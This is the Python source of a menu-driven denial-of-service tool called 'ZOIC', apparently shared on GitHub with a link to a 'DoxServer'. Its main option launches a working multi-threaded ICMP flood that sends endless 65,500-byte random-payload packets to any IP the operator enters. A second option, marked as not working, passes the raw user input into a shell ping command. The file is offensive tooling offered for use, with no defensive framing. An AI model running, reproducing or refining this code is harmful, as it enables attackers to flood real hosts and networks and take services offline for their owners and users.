import os
import random
import threading
import time
import sys
from scapy.all import IP, ICMP, send

zoic = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{zoic}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██████╗ 
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██╗
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝     █████╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗     ╚═══██╗
███████╗██║  ██║   ██║   ███████╗██║  ██║    ██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {zoic}*{clear} Github    {zoic}:{clear}   https://github.com/madanokr001      ║
║ {zoic}*{clear} DoxServer {zoic}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {zoic}*{clear} version   {zoic}:{clear}   4.0                                 ║
║ {zoic}*{clear} ZOIC      {zoic}:{clear}   {zoic}[{clear}{white}LAYER3{clear}{zoic}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {zoic}[{clear}1{zoic}]{clear} ICMP Flood Attack                               ║
║ {zoic}[{clear}2{zoic}]{clear} Ping Of Death Attack {zoic}[{clear}{red}NOT WORK{clear}{zoic}]{clear}                 ║                       
║ {zoic}[{clear}3{zoic}]{clear} Exit ZOIC                                       ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer3():
    while True:
        logo()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            def send_packet(target):
                try:
                    while True:
                        payload = random._urandom(65500)  
                        packet = IP(dst=target) / ICMP(type=8, chksum=None) / payload

                        send(packet, verbose=False)

                        print(f"[{zoic}ZOIC{clear}] IP Address {zoic}:{clear} {target} {zoic}|{clear} ICMP Packet {zoic}:{clear} {white}65500{clear}")

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Check your permissions or install {zoic}Npcap{clear} : https://npcap.com/#download")
                    time.sleep(2)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)

            def start_threads(target, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target,))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{zoic}ZOIC{clear}] IP {zoic}>{clear} ")
            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD {zoic}>{clear} "))

            start_threads(target, threads)


        elif select == "2" or select.lower() == "2":
            def ping(target):
                os.system(f"ping {target} -t -l 65500")

            target = input(f"[{zoic}ZOIC{clear}] IP {zoic}>{clear} ")

            ping(target)

        elif select == "3" or select.lower() == "3":
            sys.exit()



if __name__ == "__main__":
    layer3()
